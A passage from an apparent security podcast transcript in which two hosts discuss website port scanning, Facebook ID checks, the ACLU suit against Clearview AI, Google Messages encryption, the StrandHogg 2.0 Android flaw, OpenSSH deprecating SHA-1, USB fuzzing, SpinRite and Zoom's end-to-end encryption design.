This detection success suggests that many of the other well-known sites on the list are also using ThreatMetrix and likely scan their visitors at other sensitive times.  There are other major names:  Netflix, Target, Walmart, ESPN, Lloyd Bank, HSN, Telecharge, Ticketmaster, TripAdvisor, Paysafecard, and possibly even Microsoft.  For those sites, BleepingComputer was unable to trigger a scan.  But it seems likely that the scans may be present on site pages that weren't visited during their testing.  Lawrence posted a Google sheet, as you had up there on the screen a second ago.  I've got a link in the show notes for anyone who's interested.  I mean, it's extensive.



So he concluded his report by noting that these port scans can be blocked using uBlock Origin in Firefox.  Unfortunately, uBlock was unable to block the port scans in the new Microsoft Edge or Google Chrome because extensions can no longer have adequate permissions to uncloak the DNS CNAME records.  And we talked about this at the time.  This is something that the Chromium browsers did in the name of security, limiting the abuse of extensions.



On the other hand, sometimes you want to trust an extension to be able to do good things.  And this lack of access is something that uBlock Origin's quite curmudgeonly author Gorhill mentioned a while back.  He was not happy that he was no longer able to do as much as he wanted to.  But Bleeping Computer also tested the Brave browser, and the port scans were allowed through.  So Firefox plus uBlock is the only effective blocker.



LEO:  Yay.



STEVE:  Of these local - yeah, I know.  



LEO:  That's what I use, yeah.



STEVE:  That happens to be where I am.  In fact, something funny happened last night that we will be getting to in a minute.  



LEO:  It is conceivable these are legitimate scans.  I mean, this is, as we had talked about last week, a threat scan; right?



STEVE:  Yeah.  Apparently, based on Lawrence's feedback from his article last week, many users, you know, I don't think it's a skewed demographic.



LEO:  I don't want it, understand.



STEVE:  It's like, I don't want my browser scanning my own computer.



LEO:  Right.



STEVE:  Hands off.  But that's being done.



LEO:  You have to trust the source.  You know, I see American Express is on here, for instance.  That's a financial institution.  I think they're probably doing it for a good reason; right? 



STEVE:  Yeah.



LEO:  But you have to trust them, like that they're not going to look at what else I've got going on, you know, that kind of thing.  So, yeah.



STEVE:  Well, so Facebook has decided to require some identity verification for high-impact posters.



LEO:  So I have gotten calls on the radio show.  They're saying, hey, Facebook wanted me to send them my driver's license.  They're doing that.



STEVE:  I guess they should be flattered because it means that they have some reach.



LEO:  Yeah, they're important.



STEVE:  In Facebook parlance.  Last Thursday the Facebook blog was posted verifying the identity of people behind high-reach profiles.  This is really short, so I'll just share it verbatim.  Facebook said:  "We want to ensure the content you see on Facebook is authentic and comes from real people, not bots or others trying to conceal their identity.  In 2018, we started to verify the identity of people managing Pages with large audiences, and now we're extending ID verification to some profiles with large audiences in the U.S.  Moving forward, we'll verify the identity of people who have a pattern of inauthentic behavior to Facebook and whose posts start to rapidly go viral in the U.S.  We want people to feel confident that they understand who's behind the content they're seeing on Facebook, and this is particularly important when it comes to content that's reaching a lot of people.



"If someone chooses not to verify their identity, or the ID provided does not match the linked Facebook account, the distribution of their viral post will remain reduced so fewer people will see it.  In addition, if the person posting is a Page admin, they'll need to complete Page Publishing Authorization and will not be able to post from their Page until their account is verified through our existing Page Publisher Authorization process.  IDs will be stored securely and won't be shared on the person's profile."  That's, I think, a key that I'll come back to in a second.



LEO:  Yeah.  That's what people are worried about, yeah, exactly.



STEVE:  Yes, yes.  They said:  "Visit the Help Center for more information on the types of IDs we accept."  And they said:  "This verification process is part of our ongoing efforts to create greater accountability on Facebook and improve people's experiences on our apps."



So this is another - we have a couple more little bits.  Actually the next thing I want to talk about is Clearview that demonstrates we've got problems to solve.  But it's clear that, as a global society, we're currently struggling to figure out how to manage this new Internet-enabled social media.  We know anonymity is a powerful tool for speech freedom, but that freedom can so easily be abused that some privacy-protected accountability seems like it's going to be a necessary step as we learn to manage what we have created here.



During this past weekend's energetic protest events, many of the authentic protestors were only too happy to share their identities.  They were there for what they felt was a righteous cause.  But none of those who were looting the stores wanted to be known.  Everybody was in a big anonymous group, and a bunch of people were taking advantage of that anonymity.  And as I said, Facebook's posting notes that IDs will be stored securely and won't be shared on the person's profile.  So again, I think as long as they make that clear, and if they're presumably able to honor that, not let that identity information leak, then that seems like a useful thing.  It will probably go a long way toward beginning to get this under control.



LEO:  I guess the problem is that people just don't trust Facebook with their personal information; you know?  They're worried.  I don't know what I would do if it asked for that.  Fortunately, I'm not viral enough.



STEVE:  Well, they're certainly using it as a conduit to get access to mass amounts of people, massive reach.  So I think it seems like to me a useful tradeoff.



LEO:  There's a price to pay, a fair price.  Yeah, yeah, I agree.



STEVE:  I don't know how else you control this.



LEO:  Right.



STEVE:  I mean, literally, it's otherwise completely uncontrolled.



LEO:  Yes, troll farms.



STEVE:  So Clearview AI is in the crosshairs once again.  This time it's the ACLU that's decided that Clearview AI needs to be stopped.  The headline of the American Civil Liberties Union website is full of righteous indignation, with the headline:  "We are taking Clearview AI to court to end its privacy-destroying face surveillance activities."  Then the subhead is:  "The company's surveillance activities are a threat to privacy, safety, and security."  But I need to stop here for just a moment to note the oh-so-delicious irony of the fact that upon visiting www.aclu.org last night, my trusted Firefox browser popped up a warning which reads:  "Firefox blocked a fingerprinter on this site."  I'm not kidding, Leo.  I had the presence of mind to snap the screen, and it's in the show notes here.



LEO:  Oh, yeah, yeah.  Oh, I see this all the time, yeah.



STEVE:  Yeah.  So that's just too wonderful.  The American Civil Liberties Union on their website, which is about to get all wound up over the "privacy-destroying surveillance activities" of the Clearview AI company, is using web browser fingerprinting to track their site's visitors.



LEO:  Do they tell you what fingerprinter or what technology it's using on that?



STEVE:  I didn't go any further.  So we don't know.  And I don't have any back story on this.  You know, the ACLU is...



LEO:  They don't have ads on that site, so...



STEVE:  No.  And they are a highly charged, often controversial organization.  So perhaps they have some security or safety-related reason for adding non-browser cookie tracking to their site.  But I thought it was funny to receive this warning when going to a pro-privacy, anti-surveillance site.



LEO:  Yeah, that's weird, yeah.



STEVE:  Like the ACLU.  It's like, yes, but we're going to try to fingerprint you.  Anyway, but that aside, I agree that Clearview's arbitrary photo facial surveillance and image recognition capability represents another aspect of the Internet we have unleashed.  When you combine an Internet-connected camera in everyone's pocket with real-time fixed camera surveillance, massive cloud storage, and cloud computing resources, you get consequences that were unintended.  Like you take a whole bunch of innocent things; but when you aggregate them, you can end up with something that's not so innocent in aggregate.



So what the ACLU wrote and posted last Thursday does contain some new information, a couple things where I said, "What?"  So I want to share it.  They said, and a lot of this we know, but this sort of sets up for this new stuff:  "For several years, a little-known start-up based in New York has been amassing a database of billions of our faceprints" - which is the term they're using here - "unique biometric identifiers akin to a fingerprint or DNA profile, drawn from personal photos on our social media accounts and elsewhere online.  The company has captured these faceprints in secret, without our knowledge, much less our consent, using everything from casual selfies to photos of birthday parties, college graduations, weddings, and so much more.



"Unbeknownst to the public, this company has offered up this massive faceprint database to private companies, police, federal agencies, and wealthy individuals, allowing them to secretly track and target whomever they wish using facial recognition technology.  That company is Clearview AI, and it will end privacy as we know it if it isn't stopped.  We're taking the company to court in Illinois today on behalf of organizations that represent survivors of sexual assault and domestic violence, undocumented immigrants, and other vulnerable communities.  As the groups make clear, Clearview's face surveillance activities violate the Illinois Biometric Information Privacy Act (BIPA)" - which of course we've discussed extensively here in the past - "and represent an unprecedented threat to our security and safety.



"Face recognition technology offers a surveillance capability unlike any other technology in the past.  It makes it dangerously easy to identify and track us at protests, AA meetings, counseling sessions, political rallies, religious gatherings, and more.  For our clients  organizations that serve survivors of domestic violence and sexual assault, undocumented immigrants, and people of color  this surveillance system is dangerous and even life-threatening.  It empowers abusive ex-partners and serial harassers; exploitative companies; and ICE agents to track and target domestic violence and sexual assault survivors, undocumented immigrants, and other vulnerable communities.



"By building a mass database of billions of faceprints without our knowledge or consent, Clearview has created the nightmare scenario that we've long feared, and has crossed the ethical bounds that many companies have refused to even attempt.  Neither the United States government nor any American company is known to have ever compiled such a massive trove of biometrics."  And there I would say the operative word is "known to have." 



"Adding fuel to the fire" - get this - "Clearview sells access to a smartphone app that allows its customers, and even those using the app on a trial basis, to upload a photo of an unknown person and instantaneously receive a set of matching photos."  And we know that behind those photos is a rather extensive set of information that Clearview has amassed from the source of all these photos.  So you get names and addresses and other available information.



They said:  "Clearview's actions clearly violate BIPA.  The law requires companies that collect, capture, or obtain an Illinois resident's biometric identifier such as a fingerprint, faceprint, or iris scan to first notify that individual and obtain their written consent.  Clearview's practices are exactly the threat to privacy that the legislature intended to address, and demonstrate why states across the country should adopt legal protections like the ones in Illinois.



"In press statements, Clearview has tried to claim its actions are somehow protected by the First Amendment.  Clearview is as free to look at online photos as anyone with an Internet connection.  But what it can't do is capture our faceprints  uniquely identifying biometrics  from those photos without consent.  That's not speech.  It's conduct that the state of Illinois has a strong interest in regulating in order to protect its residents against abuse.



"If allowed, Clearview will destroy our rights to anonymity and privacy, and the safety and security that both bring.  People can change their names and addresses to shield their whereabouts and identities from individuals who seek to harm them, but they can't change their faces.  That's why we're teaming up with lawyers at the ACLU of Illinois and the law firm of Edelson PC, a nationally recognized leader in consumer privacy litigation, to put a stop to Clearview's egregious violations of privacy.  We're asking an Illinois state court to order the company to delete faceprints gathered from Illinois residents without consent, and to stop capturing new faceprints unless it complies with the Illinois law.



"There is a groundswell of opposition to face surveillance technology, and this litigation is the latest chapter in an intensifying fight to protect our privacy rights against the dangers of this menacing technology.  Across the nation, the ACLU has been advocating for bans on police use of face recognition technology, leading to strong laws in places like Oakland, San Francisco, and Berkeley, California, and Springfield and Cambridge, Massachusetts, as well as a statewide prohibition on the use of the technology on police body cams in California.  We won't let companies like Clearview trample on our right to privacy."



So they, like others who have sued previously, are using Illinois' BIPA law, since as we know it makes the strongest case.  And any ruling that might arise from this will likely be challenged and appealed and may finally wind up in front of the U.S. Supreme Court.  And as with the encryption question, that's probably for the best since someone, and it's the responsibility ultimately of our Supreme Court, needs to create some laws to guide us forward.  I just hope they are good laws because this is still the early days.  We're not at the beginning of the end or the end of the beginning.  I believe we're still at the beginning of the beginning.



And there's a lot more to happen as technology continues to progress and enable things that just weren't feasible before.  We've got insanely inexpensive mass storage, incredibly inexpensive and ever more potent AI to do image comparison.  And of course everything is glued together with cloud stuff.  So we need to decide what we as a society want to have done with all of this capability and what not.



Google Messaging appears to be heading toward end-to-end encryption, which I think is, it occurred to me, an interesting stance to take against all of this anti-encryption talk in Washington.  Which isn't going away and appears to be gaining steam.  We've previously talked about how RCS, which stands for Rich Communication Services, is the long-awaited successor to the carrier-provided SMS and MMS.  We talked about RCS years ago.



Last week the folks at APKMirror got their hands on an internal build of Google Messages, the app, v6.2.  The APK Insight team dug into it to see what appears to be coming with the next version of Google Messages.  You can just pick up little hints from typical, like, strings in the code.  The biggie that caught their attention was pretty clear evidence of end-to-end encryption being added to RCS Messaging.



So for some years now, as we know, it's been seen in RCS Messaging.  It's been seen as a successor to SMS and MMS messages, and a potential competitor to Apple's kind of multimedia iMessage.  However, one thing that iMessage and the whole Apple ecosystem offers that RCS could not was the ability to exchange privacy-protected messages that had the benefit of end-to-end encryption.



Of course, we'll need to wait for an official whitepaper before we see how all the various pieces fit together, you know, how Google has solved this problem, because that's not just a matter of the underlying crypto, which is pretty easy.  We'll be talking about this more when we talk about what Zoom is doing in here in a minute.  But if nothing else, Google has the significant advantage of being a late mover in this space, with many examples of earlier efforts to guide their ultimate design.  And they know crypto.  So I would imagine they'll do it right when they choose to do it.  And it looks like that's what they're choosing.



The APKMirror folks have found, in reverse engineering this latest v6.2 of Google Messages, 12 separate strings that make very clear reference to RCS-based encryption.  I've got them numbered and called out here in the show notes.  The first one, the string's name is "encrypted_rcs_message," and the string content is "End-to-End Encrypted Rich Communication Service message."  So it's like it's...



LEO:  That's pretty unequivocal, yeah.



STEVE:  Yeah.  Then we have "send_encrypted_button_content_description."  And the content is "Send end-to-end encrypted message."  Okay, push that button, what do you think might happen?  Then we've got "e2ee_conversation_tombstone" is a string name.  And that string expands to "Chatting end-to-end encrypted with %s," which we know is the typical printf format for expanding a string in there.  So the point is it would put up on the screen "Chatting end-to-end encrypted with Leo," and that's what it would - so it would declare that.



Then we get "metadata_encryption_status," whose content is "End-to-end encrypted message."  Pretty self-explanatory.  "e2ee_fail_to_send_retry_description," and then that says "Resend as chat."  And that was one thing that the reverse engineers noted, and some of this text suggests, is that something about this requires more endurance.  It's not exactly sure what.  But, for example, there's a string named "encryption_fallback_title," and that string is  "Send unencrypted messages?"  And then there's "encryption_default_fallback_body," which reads "SMS/MMS texts aren't end-to-end encrypted.  To send with end-to-end encryption, wait for improved data connection or send messages now as SMS/MMS."



So I guess the point is that it looks like cellular is able to do SMS/MMS, but you need an Internet connection separate from or on top of cellular in order to do the RCS encrypted messaging.  Then they have "encryption_fallback_dialog_accept_button," and that button will be labeled "Send unencrypted."  We've got "encryption_fallback_dialog_decline_button," which is labeled "Wait."  Then "encryption_sent_fallback_body," which reads "SMS/MMS texts aren't end-to-end encrypted.  To send with end-to-end encryption, wait until" something, this looks like a string has data connection.  Oh, it's the person, like Leo, "has data connection or send messages now as SMS/MMS."



Second to last is, if this is proper, "etouffee_to_telephony_setting_title," and that says "Let other apps access end-to-end encrypted messages," which is interesting.  And then, finally, "location_attachment_picker_send_encrypted_content_description."  And that string is "Send end-to-end encrypted messages with selected location," and then the location gets filled in.



So anyway, there's been no public disclosure that these guys were aware of.  I've certainly not run across any talk of Google Messages going encrypted.  But it's very clear that there's some focus being given to that.  I mean, this looks like it's done, and it's just a matter of them playing with it off the books for a while, working out the details.  And I imagine at some point in the future we're going to be getting encrypted Google Messaging when you've got an Internet connection.  Crazy the way the Internet works that way.



Okay.  Oh, boy.  We have the return of a much more worrisome StrandHogg, which is affecting all Android phones not running the latest Android 10.  They're all vulnerable.  So our listeners may remember that it was December of last year, earlier December, that StrandHogg 1.0 appeared.



The Hacker News wrote at the time, in December of 2019:  "Cybersecurity researchers have discovered a new unpatched vulnerability in the Android operating system that dozens of malicious mobile apps are already exploiting in the wild to steal users' banking and other login credentials and spy on their activities.  Dubbed StrandHogg, the vulnerability resides in the multitasking feature of Android that can be exploited by a malicious app installed on a device to masquerade as any other app on it, including any privileged system app.  In other words," they wrote, "when a user taps the icon of a legitimate app, the malware exploiting the StrandHogg vulnerability can intercept and hijack this task to display a fake interface to the user instead of launching the legitimate application."



Okay, so that was then.  Last week the same Norwegian cybersecurity researchers who found and obviously named StrandHogg being used in the wild unveiled details of an extremely critical successor vulnerability.  And they've known of this for a while.  The CVE is CVE-2020-0096.  Again, 0096.  The low number of that CVE suggests that it was assigned during the first few hours of the new year.  It affects Android OS and allows attackers to carry out a much more sophisticated version of the StrandHogg attack.  They of course called it StrandHogg 2.0.  And this vulnerability affects all Android devices except those running the very latest version.  And that's because they told Google about it at the beginning of the year, and Google was able to incorporate a fix for it into Android 10.  But that's only 15 to 20% of Android devices, which leaves the other billion-plus Android smartphones currently vulnerable to this new attack.



I have a link to their formal vulnerability disclosure, and of course it's got sort of a Norse Viking logo thing on the page, Promon.co.  And they said:  "Promon researchers have discovered a new elevation of privilege vulnerability in Android that allows hackers to gain access to almost all apps."  Which is one of the big differences.  "Classified as 'Critical Severity' by Google, the vulnerability has been named StrandHogg 2.0 by Promon due to its similarities with the infamous StrandHogg vulnerability discovered by the company in 2019.



"While StrandHogg 2.0 also enables attackers to hijack nearly any app, it allows for broader attacks and is much more difficult to detect, making it, in effect, its predecessor's evil twin.  Having learned from StrandHogg and subsequently evolved, StrandHogg 2.0 does not exploit the Android control setting 'TaskAffinity" - which is what 1.0 did - "which is what hijacks Android's multitasking feature and, as a result, leaves behind traceable markers."  Meaning 2.0 doesn't.



"StrandHogg 2.0 is executed through reflection, allowing malicious apps to freely assume the identity of legitimate apps while also remaining completely hidden.  Utilizing StrandHogg 2.0, attackers can, once a malicious app is installed on the device, gain access to private text messages and photos, steal victims' login credentials, track GPS movements, make and/or record phone conversations, and spy through a phone's camera and microphone."  Clearly this is a huge win for the state-level targeted attack use case where they want to surveil somebody.  If you don't have Android 10, this can be done to you, is what this amounts to.



Whereas StrandHogg 1.0 leveraged a vulnerability in the multitasking features of Android, this next generation 2.0 flaw is an elevation of privilege vulnerability that allows hackers to gain access to almost any app.  Unlike 1.0, which was only able to attack a specific app one at a time because it needed to have that app named in an XML manifest that allowed also those apps to be found in the Play Store, there's nothing visible in StrandHogg 2.



So they summed up in some bullet points:  "StrandHogg flaws are potentially dangerous and concerning because it's almost impossible for targeted users to spot the attack.  It can be used to hijack the interface for any app installed on a targeted device without requiring any configuration.  It can be used to request any device permission fraudulently.  It can be exploited without root access.  It works on all previous versions of Android except Q, the latest.  It does not need any special permission to work on the device.  I mean, so this is really bad.



And of course, besides stealing login credentials through a convincing fake screen, the malware can also escalate its capabilities significantly by tricking users into granting sensitive device permissions while posing as a legitimate app.  And it's much more difficult to detect because it's using code-based execution rather than, as I mentioned, needing a manifest to be bound into the app ahead of time, which made it much more visible.  There's no effective and reliable way to block or to detect task hijacking attacks.



So the only thing that can be done until you are able to get a version of Android that has this patched, and hopefully those will be forthcoming, is to look for, I mean, to like be extra sensitive about behavior that doesn't seem quite right, that you wouldn't normally expect.  For example, an app you're already logged into asking for a redundant login.  If you know the app doesn't do that, then that would be StrandHogg 2 overlaying the app, trying to get you to log in again so that it could capture your login credentials for the app.  Or permission pop-ups that do not contain an app name.  I don't know why they couldn't be customized, but they're just suggesting that would be one to look for.



Permissions asked from an app that should not require or need the permissions it's asking for.  Hopefully, everyone's always on the lookout for those.  Buttons and links in the user interface that do nothing when clicked on, meaning that they presented sort of a partial mockup of a UI and didn't bother to make it complete.  Or the back button does not work as expected, you know, because they're trying to trap you there and get you to go in the direction that they want you to.



So anyway, this exists.  It's real.  Google rates it critical.  They fixed it in Android 10.  But it's going to need patches in previous versions of Android.  And hopefully those will be forthcoming.  The problem is, as we know, lots of older devices are never going to be patched.  And now that this has been disclosed, it is there forever.  And it's clearly going to be the choice for high-level actors, state-level actors, in targeted attacks, to attack people.  Maybe it'll become more widespread.  If these StrandHogg 2.0 apps can get themselves into the Play Store, then it's not just targeted attacks, it's targets of opportunity.



So again, really a reason to only be using a smartphone that is actively receiving updates.  Look at the panic that people experience when their desktop OSes are not constantly on the IV update feed, getting a constant drip of security fixes.  We should not consider our phones to be any different.  They are pocket computers.  As we've talked about, many people are using them now in place of desktop or laptops because they've become so capable.  You cannot be using it if it's not getting updates.  I just think we need to have an industry-wide change in policy to require updates as part of consumer protection.  To require updates as long as a phone is offering useful service, it needs to be receiving a flow of updates in order to fix these kinds of problems.  Hasn't happened yet.  We've talked about this before.  But needs to.



The SHA-1 hash is finally going to be dropped from OpenSSH.  The release notes from last Wednesday's OpenSSH update read:  "It's now possible to perform chosen-prefix attacks against the SHA-1 algorithm for less than 50,000 USD.  For this reason, we will be disabling 'ssh-RSA' public key signature algorithm by default in a near-future release."  In other words, OpenSSH will be finally shutting down SHA-1 as an available algorithm.  They wrote:  "This algorithm is unfortunately still used widely despite the existence of better alternatives, being the only remaining public key signature algorithm specified by the original SSH RFCs."



Now, to no one's surprise, the very real problem is that the world is full of aging network switches, low-cost embedded machines, many running ATMs and industrial control systems.  They all contain older SSH servers that only speak SHA-1.  This means that new systems that will be lacking support for SHA-1 will no longer be able to connect as they always could.  It's truly a mess.  It effectively means that much as we may wish to stop using SHA-1, we really cannot for those applications.  Old OpenSSH-based clients will remain for use in connecting to those old servers.  But those older clients will no longer be maintainable, since any updates to them would remove their support for SHA-1, which they need in order to connect to the old servers.  Thus, embedded servers that cannot be updated are holding back updates to clients that would like the advantage of better security, but they can't update.



So I don't know what'll happen.  I guess maybe people will start running two sets of clients.  They'll have the clients that they can use to connect with more security, but they'll have to keep an old creaky SSH client around that still supports SHA-1 for those instances where they need to do administration to embedded devices that still only know SHA-1.  Wow.  It's a mess.



Speaking of messes, what happens when you fuzz USB?  You find 26 new, previously unknown flaws, many of them critical, residing in our USB-supporting desktop OSes.  We've talked many times about how important fuzzing is as a semi-automated means of uncovering previously unknown flaws in software.  I would argue that those who are interested in exploring the idea of being a vulnerability finder for profit, probably the best way to start is with fuzzing.  You've got to be a coder sort of by definition.  So code up a fuzzer of something and turn it loose.  And when something crashes, that's your next challenge, figure out what happened that crashed it and see if there's a vulnerability there that you can turn into a payday.



But in any event, the researchers who built this new USB fuzzing tool used it to uncover one bug in FreeBSD; three bugs in macOS, two of those resulting in an unplanned reboot and one which froze the system.  They found four flaws in Windows 8 and 10.  Those resulted in Blue Screens of Death.  That's always, you know, where a flaw starts to become a vulnerability.  And the greatest number of bugs and those most severe were found in Linux, a total of 18.  16 of those 18 were memory bugs having high security impact in various Linux subsystems - the USB Core, USB sound, and the network.  One bug resided in the USB host controller driver, and the last was in a USB camera driver.



The cool thing is the researchers responsibly reported these bugs to the Linux kernel team, along with proposed patches, to reduce the burden on the kernel developers when fixing the reported vulnerabilities.  And this is one of the powerful advantages of Linux being open source.  Those finding a problem can directly examine the cause of the problem in the source and propose patches to repair the problem.  This is not something that can be done with Windows or macOS, since those systems are closed-source mysteries.  Of those 18 Linux bugs, the research team said 11 received a patch since their initial reports last year, so leaving seven outstanding.  10 of the 11 bugs also received a CVE designation because it was deemed serious enough.  Additional patches are expected in the near future for the seven remaining issues.



The researchers said:  "The remaining bugs fall into two classes:  those still under embargo/being disclosed, and those that were concurrently found and reported by other researchers."  So they plan to present their research at the USENIX Security Symposium virtual security conference scheduled for August of this year, in 2020.  And they've been preceded by other USB fuzzing tools.  There was one called vUSBf.  There's one, syzkaller, and usb-fuzzer.



So they're not the first to fuzz USB.  But they feel that their tool, called USBFuzz, is superior to those that came before because it provides testers with more control over the test data, and it's portable to non-Unix-like OSes, so it'll run under Mac or Windows as the host of the tool, unlike any of the other tools.  And it'll be released on GitHub as an open source project following their USENIX talk.  If anyone is interested, I've got the repo link here, although at the moment it just takes you to a 404 error.  They have not yet put up a page, but they will be.



SpinRite:  Yesterday I reached the end of a surprisingly challenging bit of development for the SpinRite project.  As we all know, SpinRite has always run on top of the FreeDOS clone of MS DOS.  The SpinRite v6.x series, that is, .1, .2, and however many I do to basically catch it up with the technology change that's happened since 2004, will continue to do so, since this will let me get it out sooner to everybody who's waiting.  But although that SpinRite will no longer use the BIOS, that's what all this next work is about, it does still use DOS.  And DOS can still only boot from a BIOS-based system.  And the FreeDOS people have stated - that's the only DOS that's still alive - they're never going to support UEFI.



So once the SpinRite 6 series are finished, my plan is to immediately remove SpinRite's dependence upon DOS so that it is able to boot natively as its own OS, essentially.  And that will allow it to also boot from UEFI-based systems that will not boot, as I said, any form of DOS.  One of the most frequently used words in that prior paragraph is "boot," which is where my efforts the past three weeks have been spent.



I now have a little Windows command line utility that can take a removable USB drive in any possible initial state - already formatted, unformatted, never formatted, formatted with some foreign thing like by the macOS with a GPT plus a FAT file system, whatever, with or without any defined partition, whether or not bootable, and replace it with a pure and perfect new bootable system.  It runs on anything from Windows XP through Windows 10.  I'm using only my own new partition and file system code, which I've just written, so that I'll be able to evolve this codebase in the future when it needs to be prepping a more complex bootable drive that can, for example, boot under either the BIOS or UEFI.



It was surprisingly tricky to get it working under every condition and circumstance.  But thanks to the terrific testing of the gang who's hanging out over in the grc.spinrite.dev newsgroup, it appears as of yesterday that we are finally there.  Once it's finished, that code, because right now I just quickly put it together as a command line EXE, but it's all Windows code.  That code will be moved into SpinRite's boot prep GUI for easy use.  And I spent this much time to get boot prep exactly right because everything in the future that I'll be doing will be using this code:  the initial SpinTest drive benchmark, which will be freeware, and which everyone here listening to this podcast will be invited to play with; all the future SpinRite work; and also the Beyond Recall secure drive wiping utility.  They're all going to be bootable.



The utility has even managed to repair a number of its testers' thumb drives that were either dead or thought to be dead or messed up in various ways so that they'd stopped working.  So it brought them back to life.  And since it also usually recovers a bit of previously unavailable and unused space on USB drives, I expect I'll also release it as a piece of freeware as a command line for removable USB drive formatting.



So anyway, that is done, and I will be returning to - we're going to do a little work now on using it to boot FreeBSD.  Actually, it's doing that already, and it appears to be fully functional.  I just haven't turned my attention to it until it was time.  And I've now got booting nailed.  So I'm happy to have this technology, as I said.  It's what we'll be using moving forward.  And when you use SpinTest or SpinRite to create a boot USB, it'll just work.  It handles all of the possible weird things that could go wrong for the user.



So from Zoom Communications we have Josh Blum, Simon Booth, Oded Gal, Maxwell Krohn, Karan Lyons, Antonio Marcedone, Mike Maxim, Merry Ember Mou, Jack O'Connor, and Miles Steele.



LEO:  Couple of those names we know well because they came from Keybase.



STEVE:  Ah, exactly, exactly.  And there is a reference to them in the doc.  From Johns Hopkins we have well-known cryptographer and professor Matthew Green.



LEO:  Wow, okay.



STEVE:  From Stanford University we have Alex Stamos.



LEO:  Okay.



STEVE:  And we also have privacy expert Lea Kissner, formerly Google's global lead for privacy technology.



LEO:  Pretty impressive.



STEVE:  Their names adorn the top of the 25-page detailed technical cryptography paper they collectively published on GitHub Friday before last on May 20th.  That paper is simply titled "E2E Encryption for Zoom Meetings."  And it begins by stating its purpose:  "Hundreds of millions of participants join Zoom Meetings each day.  They use Zoom to learn, among classmates scattered by recent events; to connect with friends and family; to collaborate with colleagues; and, in some cases, to discuss critical matters of state.  Zoom users deserve excellent security guarantees, and Zoom is working to provide these protections in a transparent and peer-reviewed process.



"This document, mindful of practical constraints, proposes major security and privacy upgrades for Zoom.  We are at the beginning of a process of consultation with multiple stakeholders including clients, cryptography experts, and civil society.  As we receive feedback, we will update this document to reflect changes in roadmap and cryptographic design."



So as we've observed here on this podcast many times, across a great many different security challenges, in the end the weakest link in an end-to-end encryption system is the management of that system's keys.  It all comes down to the keys.  The task of actually encrypting and decrypting data at each end, given a shared key, has long ago been solved.  How often are we talking about the way Apple manages iMessages keys, and how much does our U.S. Attorney General lust for some form of magical golden key?  That's what he wants.



So Zoom's security team has properly determined that the first problem to solve, the first place to tighten things is with the system's key management.  Once you have that, then the next weak link is identity, verifying that meeting participant identities are not being spoofed or forged.  But it makes no sense to worry about that before you know that the resulting keys are safe.



So here's how Zoom describes the operation of their current system, the one they have now.  They said:  "Zoom Meetings currently use encryption to protect identity, data for meeting setup, and meeting contents.  Zoom provides software for desktop and mobile operating systems, and embeds software in Zoom Room devices.  In this document, when we refer to 'Zoom clients,' we include all of these various forms of packaging.  Crucially, these are systems to which we can deploy cryptographic software.  Zoom Meetings also supports web browsers through a combination of WebRTC and custom code.  If enabled, Zoom meetings support the use of clients not controlled by Zoom, namely phones using the Public Switched Telephone Network (PSTN) and room systems supporting SIP and H.323," you know, IP phones technology.



They said:  "In the meeting settings, as opposed to webinars, Zoom supports up to 1,000 simultaneous users."  Webinars, I didn't realize, Leo, they could be 50,000 people in a webinar.  Whoo.  "When a Zoom client gains entry to a Zoom meeting, it receives a 256-bit per-meeting key created by Zoom's servers, which retain the key to distribute to participants as they join.  In the version of Zoom's meeting encryption protocol set for release on May 30th" - so that has already happened; that was, what, last Saturday, three or four days ago - "this per-meeting key is used to derive a per-stream key."



Okay.  So essentially what they originally had, when we first started talking about Zoom, when coronavirus hadn't yet happened, was a single key which the server created, which was simply distributed to all the clients who joined, to use that for encryption and decryption.  So, yes, it was encrypted.  Technically it was end to end.  But practically, the server made the key.  So it was no mystery to anybody within the Zoom infrastructure.  One of the things that is clearly necessary is to arrange to blind Zoom's infrastructure to the key being used by the clients to communicate so that the infrastructure is simply transiting pre-encrypted data that it is unable to see into.



But they made an interim change on Saturday, May 30th.  The per-meeting key, which used to just be one, is now being used to derive a per-stream key by combining the per-meeting key with a non-secret stream ID using an HMAC.  Each stream key is used to encrypt audio/video UDP packets using now AES in GCM mode.  Remember they were using electronic codebook, which is not very secure, or at least it leaks information about the plaintext, so GCM is way stronger, with each client emitting one or more uniquely identified streams.  Those packets are relayed and multiplexed via one or more Multimedia Routers, they call them, MMRs, Multimedia Routers, within Zoom's infrastructure.



The MMR servers do not decrypt these packets to route them.  There's no mechanism to re-key a meeting.  Videoconferencing systems in which the server relies on plaintext access to the meeting content to perform operations such as multiplexing would be exceptionally difficult to secure end to end.  You know, you're asking for something that isn't end to end.  In this design, we take advantage of the fact that the Zoom servers do not require any access to meeting content, allowing end-to-end security at exceptionally large scale.



Then they put in some caveats, of course.  If telephones or IP phone clients are authorized to join, in that case the MMR, the multimedia router, provides the per-meeting encryption key to specialized connection servers within Zoom's infrastructure.  These servers act as a proxy.  They decrypt and composite the meeting content streams in the same manner as a Zoom client and then re-encode the content in a manner appropriate for the connecting client.  Zoom's optional cloud recording feature works similarly, recording the decrypted streams and hosting the resulting file in Zoom cloud for the user to access.  In the current design, Zoom's infrastructure brokers access to the meeting key.



So anyway, so they're basically saying, if you have a client that is unable to have the capability of doing the encryption/decryption, if it's a dumb client like a telephone or an IP phone that all it can do is receive and transmit standard data, then they will proxy for that client.  And then the link to the client is unencrypted because the client doesn't support encryption.



They finish:  "This current design provides confidentiality and authenticity for all Zoom data streams, but it does not provide true end-to-end encryption as understood by security experts due to the lack of end-to-end key management.  In the current implementation, a passive adversary who can monitor Zoom's server infrastructure and who has access to the memory of the relevant Zoom servers may be able to defeat encryption.  The adversary can observe the shared meeting key, derive session keys, and decrypt all meeting data."  Again, you've got to be at  Zoom to do that.  But still.



"Zoom's current setup, as well as virtually every other cloud product, relies on securing that infrastructure in order to achieve overall security.  End-to-end encryption, using keys at the endpoints only, allows us to reduce reliance on the security of Zoom's infrastructure."  And that's where they will be heading.



So they divided the task of getting from where they are now to where they want to go into four successive phases.  And this 25-page document, I saw you had the top of it, Leo.  If you scroll down about, oh, not that far, like a third of the way, you start hitting all the crypto equations.  And it's like, okay.



LEO:  Yeah, it's cool.



STEVE:  So, I mean, it's all there.  But it's really not necessary.  I mean, essentially, we know how to do crypto now.  There's no way for me to discuss the detailed design of the various algorithms on an audio podcast.  And there's a large amount of it.  But that doesn't really matter because, when it's done correctly, it works.  And everybody who's there knows how to do it correctly.  The overall architecture is the key, and that can be usefully characterized.



